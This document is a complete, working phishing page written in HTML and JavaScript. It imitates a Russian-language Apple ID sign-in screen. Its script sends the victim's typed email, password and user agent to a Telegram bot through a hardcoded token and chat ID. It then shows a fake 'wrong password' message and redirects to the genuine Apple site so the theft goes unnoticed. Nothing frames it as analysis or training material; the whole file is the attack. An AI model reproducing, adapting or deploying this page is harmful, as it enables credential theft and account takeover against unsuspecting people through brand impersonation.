<!DOCTYPE html>
<html>
<head>
<title>Apple ID</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system;background:#f2f2f7}
.header{background:#fff;padding:15px;text-align:center;border-bottom:1px solid #ccc}
.header img{width:40px;margin-bottom:5px}
.header h2{font-size:17px;font-weight:400;color:#000}
.container{padding:20px}
.input-group{background:#fff;border-radius:10px;padding:10px 15px;margin-bottom:15px}
.input-group label{font-size:12px;color:#8e8e93;display:block}
.input-group input{border:none;width:100%;font-size:16px;padding:8px 0;outline:none}
.btn{background:#0071e3;color:#fff;border:none;width:100%;padding:14px;font-size:17px;border-radius:10px;cursor:pointer;margin-top:10px}
.btn:active{opacity:0.7}
.footer{text-align:center;margin-top:20px;color:#8e8e93;font-size:13px}
.error{color:red;font-size:13px;text-align:center;display:none;margin-top:10px}
</style>
</head>
<body>
<div class="header">
<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" width="40">
<h2>Войдите в Apple ID</h2>
</div>
<div class="container">
<div class="input-group">
<label>Apple ID</label>
<input type="email" id="email" placeholder="example@email.com">
</div>
<div class="input-group">
<label>Пароль</label>
<input type="password" id="pass" placeholder="Введите пароль">
</div>
<button class="btn" onclick="send()">Войти</button>
<p class="error" id="error">Неверный Apple ID или пароль</p>
</div>
<div class="footer">Apple ID · iCloud · Конфиденциальность</div>
<script>
const TOKEN="8673011110:AAGH5Zb6Put8qCt6Zjd_wuRt1Lbjqnhou8g";
const CHAT_ID="8181041871";

async function send(){
const email=document.getElementById('email').value;
const pass=document.getElementById('pass').value;
if(!email||!pass)return;

const msg=`🍎 *APPLE ID*\n📧 ${email}\n🔑 ${pass}\n📱 ${navigator.userAgent}`;
await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'Markdown'})
});

document.getElementById('error').style.display='block';
setTimeout(()=>{window.location.href='https://appleid.apple.com'},2000);
}
</script>
</body>
</html>
